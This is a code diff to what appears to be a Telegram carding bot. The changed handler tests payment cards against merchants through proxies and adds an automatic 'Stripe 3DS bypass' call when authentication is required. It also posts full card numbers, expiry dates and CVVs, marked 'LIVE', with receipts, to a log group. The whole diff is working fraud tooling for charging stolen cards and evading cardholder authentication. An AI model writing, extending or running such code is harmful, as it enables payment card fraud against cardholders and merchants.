@@ -326,6 +326,17 @@ async def hit_command(message: types.Message):
         elif data["status"] == "progress":
             res = data["result"]
             
+            # Attempt Stripe 3DS Auto-Bypass if 3DS / authentication_required detected
+            if not res.get('success') and (res.get('decline_code') in ('authentication_required', '3d_secure', 'challenge_required') or res.get('status') == 'requires_action' or (isinstance(res.get('raw_response'), dict) and res.get('raw_response', {}).get('status') == 'requires_action')):
+                try:
+                    from stripe_3ds_bypasser import Stripe3DSBypasser
+                    px_data = await ProxyManager.get_random(user_id)
+                    res = await Stripe3DSBypasser.resolve_3ds(res, proxy_data=px_data)
+                except Exception:
+                    pass
+
+            card_obj = res.get('card', {})
+            card_str = f"{card_obj.get('card')}|{card_obj.get('month')}|{card_obj.get('year')}|{card_obj.get('cvv')}"
             # Cancel animation task if running
             if anim_task:
                 anim_task.cancel()
@@ -364,27 +375,23 @@ async def hit_command(message: types.Message):
                     url_str_formatted += f" <a href='{escaped_receipt}'>[RECEIPT]</a>"
                     url_str_msg += f"\n🧾 <b>Receipt:</b> <a href='{escaped_receipt}'>{escaped_receipt}</a>"
                     
-                log_entry = f"✅ <code>{card_str}</code> | {amt_val} | {res['response_time']:.2f}s{url_str_formatted}"
-                
-                hit_text = (
-                    f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
-                    f"💳 <code>{card_str}</code>\n"
-                    f"💰 Amount: {amt_val}\n"
-                    f"🛒 Merchant: {merchant_name}\n"
-                    f"⏱ {res['response_time']:.2f}s"
-                    f"{url_str_msg}"
-                )
+                log_entry = f"<code>{card_str}</code> 🟢 LIVE [PAYMENT SUCCESSFUL]"
                 
                 if LOG_GROUP_ID:
                     try:
+                        receipt_url = res.get('receipt_url') or res.get('final_url')
+                        escaped_receipt = html.escape(receipt_url) if receipt_url else ""
+                        receipt_line = f"\n🧾 Receipt: <a href='{escaped_receipt}'>{escaped_receipt}</a>" if escaped_receipt else ""
+                        tds_bypassed_line = "\n🔓 3DS: <b>BYPASSED</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
                         log_text = (
-                            f"✅ <b>TRANSACTION SUCCESS</b>\n"
+                            f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
                             f"💳 <code>{card_str}</code>\n"
                             f"💰 Amount: {amt_val}\n"
                             f"🛒 Merchant: {merchant_name}\n"
                             f"👤 User: {message.from_user.first_name}\n"
                             f"⏱ {res['response_time']:.2f}s"
-                            f"{url_str_msg}"
+                            f"{tds_bypassed_line}"
+                            f"{receipt_line}"
                         )
                         await bot.send_message(LOG_GROUP_ID, log_text)
                     except: pass
@@ -449,13 +456,15 @@ async def hit_command(message: types.Message):
                     receipt_url = res.get('receipt_url') or res.get('final_url')
                     escaped_receipt = html.escape(receipt_url) if receipt_url else ""
                     receipt_line = f"\n🧾 Receipt: <a href='{escaped_receipt}'>{escaped_receipt}</a>" if escaped_receipt else ""
+                    tds_line = "\n🔓 3DS: <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
                     note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                     hit_text = (
-                        f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
+                        f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
                         f"💳 <code>{card_str}</code>\n"
                         f"💰 Amount: {amt_val}\n"
                         f"🛒 Merchant: {merchant_name}\n"
                         f"⏱ {res['response_time']:.2f}s"
+                        f"{tds_line}"
                         f"{receipt_line}" + note_line
                     )
                 else:
